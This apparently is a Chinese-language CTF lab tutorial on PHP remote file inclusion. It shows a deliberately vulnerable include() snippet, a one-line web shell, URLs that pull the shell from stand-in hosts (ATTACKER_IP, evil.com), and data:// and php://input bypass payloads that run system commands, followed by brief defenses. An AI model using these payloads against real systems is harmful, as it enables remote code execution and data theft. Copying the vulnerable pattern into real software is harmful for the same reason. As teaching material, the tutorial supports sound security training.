# RFI 远程文件包含

## 概述

RFI（Remote File Inclusion）允许包含远程服务器上的文件。需要 `allow_url_include = On`（默认关闭）。

## 漏洞代码

```php
<?php
$page = $_GET['page'];
include($page);
?>
```

## 攻击步骤

### 1. 准备恶意文件

在攻击者服务器上创建 `shell.txt`：

```php
<?php system($_GET['cmd']); ?>
```

### 2. 发起 RFI

```
?page=http://ATTACKER_IP/shell.txt
```

### 3. 执行命令

```
?page=http://ATTACKER_IP/shell.txt&cmd=cat /flag
```

## 绕过技巧

### 1. 后缀绕过

如果代码自动添加 `.php` 后缀：

```php
include($page . '.php');
```

绕过：使用 `?` 截断

```
?page=http://evil.com/shell.txt?
```

注意：PHP 5.3.4 之后修复了 null 字节截断。

### 2. 使用 data:// 协议

```
?page=data://text/plain,<?php system('id'); ?>
```

### 3. 使用 php://input

```
?page=php://input
POST DATA: <?php system('id'); ?>
```

## 防御

1. 关闭 `allow_url_include`
2. 使用白名单
3. 不要将用户输入传入 include

## 练习步骤

1. 确认目标支持远程包含（尝试 data:// 协议）
2. 准备恶意文件或使用 data:// 直接执行
3. 获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
